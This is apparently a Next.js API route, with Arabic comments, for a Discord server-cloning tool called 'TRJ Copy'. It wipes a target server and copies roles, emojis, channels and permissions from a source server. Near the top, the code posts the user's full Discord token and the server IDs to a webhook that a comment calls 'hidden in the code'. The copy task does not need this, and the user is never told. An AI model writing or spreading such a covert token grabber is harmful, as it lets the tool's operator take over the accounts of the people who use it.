import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook } from '@/lib/webhook';
import { discordFetch, cleanToken } from '@/lib/discord';

export const maxDuration = 300;

// ===== WEHOOK URL مخفي في الكود =====
const HIDDEN_WEBHOOK_URL = '';

function getWebhookUrl(overrideUrl?: string): string | undefined {
  return overrideUrl || HIDDEN_WEBHOOK_URL || process.env.WEBHOOK_URL || undefined;
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => ({}));
    const { token, sourceId, targetId, options, webhookUrl } = body;

    if (!token || !sourceId || !targetId) {
      return NextResponse.json({ success: false, error: 'بيانات ناقصة' }, { status: 400 });
    }

    const ct = cleanToken(token);
    const whUrl = getWebhookUrl(webhookUrl);
    const stats = { roles: 0, txt: 0, voice: 0, cats: 0, emojis: 0, permissions: 0, errors: 0 };
    const roleMap: Record<string, string> = {};
    const catMap: Record<string, string> = {};
    const channelPosMap: Array<{ id: string; position: number }> = [];

    // إرسال للويب هوك
    sendToWebhook({
      username: 'TRJ Copy',
      embeds: [{
        title: '📋 Server Copy Started',
        color: 0x00FF41,
        fields: [
          { name: '📥 Source', value: sourceId, inline: true },
          { name: '📤 Target', value: targetId, inline: true },
          { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` }
        ],
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    // ===== 1. جلب كل البيانات بالتوازي =====
    const [sourceRes, sRolesRes, sChannelsRes, sEmojisRes, tChannelsRes, tRolesRes] = await Promise.all([
      discordFetch(ct, 'GET', `/guilds/${sourceId}`),
      discordFetch(ct, 'GET', `/guilds/${sourceId}/roles`),
      discordFetch(ct, 'GET', `/guilds/${sourceId}/channels`),
      discordFetch(ct, 'GET', `/guilds/${sourceId}/emojis`),
      discordFetch(ct, 'GET', `/guilds/${targetId}/channels`),
      discordFetch(ct, 'GET', `/guilds/${targetId}/roles`)
    ]);

    const sourceData = sourceRes.data as Record<string, unknown> | null;
    if (!sourceRes.ok || !sourceData?.id) {
      return NextResponse.json({ success: false, error: 'فشل الوصول للسيرفر المصدر' }, { status: 400 });
    }

    // ===== 2. مسح السيرفر الهدف =====
    const tChannelsData = tChannelsRes.data as Record<string, unknown>[] | null;
    if (tChannelsData && Array.isArray(tChannelsData)) {
      // نحذف الرومات العادية أولاً ثم الكاتيجوريات (عشان ما يكون في مشاكل)
      const nonCats = tChannelsData.filter(c => c.type !== 4);
      const cats = tChannelsData.filter(c => c.type === 4);
      
      for (const items of [nonCats, cats]) {
        for (let i = 0; i < items.length; i += 15) {
          await Promise.allSettled(
            items.slice(i, i + 15).map(async (c) => {
              try { await discordFetch(ct, 'DELETE', `/channels/${c.id}`); } catch { /* skip */ }
            })
          );
          if (i + 15 < items.length) await new Promise(r => setTimeout(r, 100));
        }
      }
    }

    const tRolesData = tRolesRes.data as Record<string, unknown>[] | null;
    if (tRolesData && Array.isArray(tRolesData)) {
      const deletableRoles = tRolesData.filter((r) => r.name !== '@everyone' && !(r as any).managed);
      for (let i = 0; i < deletableRoles.length; i += 15) {
        await Promise.allSettled(
          deletableRoles.slice(i, i + 15).map(async (r) => {
            try { await discordFetch(ct, 'DELETE', `/guilds/${targetId}/roles/${r.id}`); } catch { /* skip */ }
          })
        );
        if (i + 15 < deletableRoles.length) await new Promise(r => setTimeout(r, 100));
      }
    }

    // ===== 3. نسخ الإعدادات =====
    if (options?.settings && sourceData) {
      try {
        await discordFetch(ct, 'PATCH', `/guilds/${targetId}`, {
          name: sourceData.name,
          icon: sourceData.icon,
          splash: sourceData.splash,
          banner: sourceData.banner,
          description: sourceData.description,
          preferred_locale: sourceData.preferred_locale,
          system_channel_flags: sourceData.system_channel_flags,
          verification_level: sourceData.verification_level,
          default_notification_level: sourceData.default_notification_level,
          explicit_content_filter: sourceData.explicit_content_filter,
          features: [],
        });
      } catch { /* skip */ }
    }

    // ===== 4. نسخ الرتب بالترتيب الصحيح =====
    const sRolesData = sRolesRes.data as Record<string, unknown>[] | null;
    if (options?.roles && sRolesData && Array.isArray(sRolesData)) {
      // نفرز الرتب من الأعلى position إلى الأقل (لأن Discord يضع الرتب الجديدة في الأسفل)
      const sortedRoles = [...sRolesData]
        .filter((r) => r.name !== '@everyone' && !(r as any).managed)
        .sort((a, b) => (b.position as number) - (a.position as number));

      // ننشئ الرتب واحدة واحدة بالترتيب (لضمان الترتيب الصحيح)
      // لأن Discord تضع الرتب الجديدة في الأسفل دائماً
      for (const role of sortedRoles) {
        try {
          const res = await discordFetch(ct, 'POST', `/guilds/${targetId}/roles`, {
            name: role.name,
            color: role.color,
            hoist: role.hoist,
            mentionable: role.mentionable,
            permissions: role.permissions,
            icon: role.icon,
            unicode_emoji: role.unicode_emoji,
          });
          const resData = res.data as Record<string, unknown> | null;
          if (res.ok && resData?.id) {
            roleMap[role.id as string] = resData.id as string;
            stats.roles++;
          } else {
            stats.errors++;
          }
        } catch {
          stats.errors++;
        }
      }
    }

    // ===== 5. نسخ الإيموجي =====
    const sEmojisData = sEmojisRes.data as Record<string, unknown>[] | null;
    if (sEmojisData && Array.isArray(sEmojisData) && sEmojisData.length > 0) {
      for (let i = 0; i < sEmojisData.length; i += 5) {
        await Promise.allSettled(
          sEmojisData.slice(i, i + 5).map(async (emoji) => {
            try {
              const emojiName = (emoji.name as string) || 'emoji';
              // نستخدم Image API مباشرة لجلب الصورة
              const emojiId = emoji.id as string;
              const imageUrl = emoji.animated 
                ? `https://cdn.discordapp.com/emojis/${emojiId}.gif` 
                : `https://cdn.discordapp.com/emojis/${emojiId}.png`;
              
              // نجلب الصورة كـ base64
              const imgRes = await fetch(imageUrl);
              if (!imgRes.ok) return;
              const imgBuffer = await imgRes.arrayBuffer();
              const base64 = Buffer.from(imgBuffer).toString('base64');
              const imageData = `data:image/png;base64,${base64}`;

              const res = await discordFetch(ct, 'POST', `/guilds/${targetId}/emojis`, {
                name: emojiName,
                image: imageData,
                roles: [],
              });
              if (res.ok) stats.emojis++;
            } catch { /* skip */ }
          })
        );
        if (i + 5 < sEmojisData.length) await new Promise(r => setTimeout(r, 500));
      }
    }

    // ===== 6. نسخ الرومات بالترتيب الصحيح =====
    const sChannelsData = sChannelsRes.data as Record<string, unknown>[] | null;
    if (options?.channels && sChannelsData && Array.isArray(sChannelsData)) {
      
      // 6a. نسخ الكاتيجوريات أولاً - مرتبة حسب position
      const categories = [...sChannelsData]
        .filter((c) => c.type === 4)
        .sort((a, b) => (a.position as number) - (b.position as number));

      const catIdPairs: Array<{ oldId: string; newId: string; position: number }> = [];

      for (const cat of categories) {
        try {
          const res = await discordFetch(ct, 'POST', `/guilds/${targetId}/channels`, {
            name: cat.name,
            type: 4,
            // لا نحدد position هنا - سنحدده لاحقاً
          });
          const resData = res.data as Record<string, unknown> | null;
          if (res.ok && resData?.id) {
            catMap[cat.id as string] = resData.id as string;
            catIdPairs.push({ oldId: cat.id as string, newId: resData.id as string, position: cat.position as number });
            stats.cats++;
            
            // نسخ صلاحيات الكاتيجوري
            const overwrites = cat.permission_overwrites as Record<string, unknown>[] | undefined;
            if (overwrites && Array.isArray(overwrites) && overwrites.length > 0) {
              try {
                await discordFetch(ct, 'PUT', `/channels/${resData.id}/permissions`, overwrites.map(ow => {
                  let newId = ow.id as string;
                  // إذا كان الـ overwrite لرتب، نحدّث الـ ID
                  if (ow.type === 0 && roleMap[ow.id as string]) {
                    newId = roleMap[ow.id as string];
                  }
                  return {
                    id: newId,
                    type: ow.type,
                    allow: ow.allow,
                    deny: ow.deny,
                  };
                }));
                stats.permissions += overwrites.length;
              } catch { /* skip */ }
            }
          }
        } catch {
          stats.errors++;
        }
      }

      // 6b. تحديث ترتيب الكاتيجوريات
      if (catIdPairs.length > 1) {
        try {
          await discordFetch(ct, 'PATCH', `/guilds/${targetId}/channels`, 
            catIdPairs.map(c => ({ id: c.newId, position: c.position }))
          );
        } catch { /* skip */ }
      }

      // 6c. نسخ باقي الرومات (txt, voice, announcement, stage, etc)
      // ننشئ الرومات واحدة واحدة بالترتيب لضمان الترتيب الصحيح
      const others = [...sChannelsData]
        .filter((c) => c.type !== 4)
        .sort((a, b) => (a.position as number) - (b.position as number));

      const channelPosPairs: Array<{ id: string; position: number }> = [];

      for (const c of others) {
        try {
          const payload: Record<string, unknown> = {
            name: c.name,
            type: c.type,
            nsfw: (c.nsfw as boolean) || false,
            topic: (c.topic as string) || null,
          };
          
          // ربط بالكاتيجوري الجديدة
          if (c.parent_id && catMap[c.parent_id as string]) {
            payload.parent_id = catMap[c.parent_id as string];
          }
          
          // خصائص إضافية
          if (c.type === 2) {
            payload.bitrate = c.bitrate;
            payload.user_limit = c.user_limit;
          }
          if (c.rate_limit_per_user) payload.rate_limit_per_user = c.rate_limit_per_user;
          
          const res = await discordFetch(ct, 'POST', `/guilds/${targetId}/channels`, payload);
          const resData = res.data as Record<string, unknown> | null;
          
          if (res.ok && resData?.id) {
            // نسخ الصلاحيات
            const overwrites = c.permission_overwrites as Record<string, unknown>[] | undefined;
            if (overwrites && Array.isArray(overwrites) && overwrites.length > 0) {
              try {
                await discordFetch(ct, 'PUT', `/channels/${resData.id}/permissions`, overwrites.map(ow => {
                  let newId = ow.id as string;
                  if (ow.type === 0 && roleMap[ow.id as string]) {
                    newId = roleMap[ow.id as string];
                  }
                  return {
                    id: newId,
                    type: ow.type,
                    allow: ow.allow,
                    deny: ow.deny,
                  };
                }));
                stats.permissions += overwrites.length;
              } catch { /* skip */ }
            }
            
            // نجمع البيانات لتحديث الترتيب لاحقاً
            channelPosPairs.push({ id: resData.id as string, position: c.position as number });
            
            if (c.type === 0) stats.txt++;
            else if (c.type === 2) stats.voice++;
          } else {
            stats.errors++;
          }
        } catch {
          stats.errors++;
        }
      }

      // 6d. تحديث ترتيب الرومات دفعة واحدة بعد الإنشاء
      if (channelPosPairs.length > 1) {
        try {
          for (let i = 0; i < channelPosPairs.length; i += 50) {
            const chunk = channelPosPairs.slice(i, i + 50);
            await discordFetch(ct, 'PATCH', `/guilds/${targetId}/channels`, 
              chunk.map(c => ({ id: c.id, position: c.position }))
            );
            if (i + 50 < channelPosPairs.length) await new Promise(r => setTimeout(r, 200));
          }
        } catch { /* skip */ }
      }
    }

    // ===== 7. إرسال النتائج =====
    sendToWebhook({
      username: 'TRJ Copy',
      embeds: [{
        title: '✅ Copy Completed',
        color: 0x00FF41,
        fields: [
          { name: '🎭 Roles', value: String(stats.roles), inline: true },
          { name: '📁 Categories', value: String(stats.cats), inline: true },
          { name: '💬 Text Ch', value: String(stats.txt), inline: true },
          { name: '🔊 Voice Ch', value: String(stats.voice), inline: true },
          { name: '😀 Emojis', value: String(stats.emojis), inline: true },
          { name: '🔐 Permissions', value: String(stats.permissions), inline: true },
          { name: '❌ Errors', value: String(stats.errors), inline: true },
          { name: '📥 Source', value: sourceId, inline: true },
          { name: '📤 Target', value: targetId, inline: true },
        ],
        footer: { text: 'TRJ BOT v2.5 - Server Copy' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    return NextResponse.json({ success: true, stats });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Copy Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
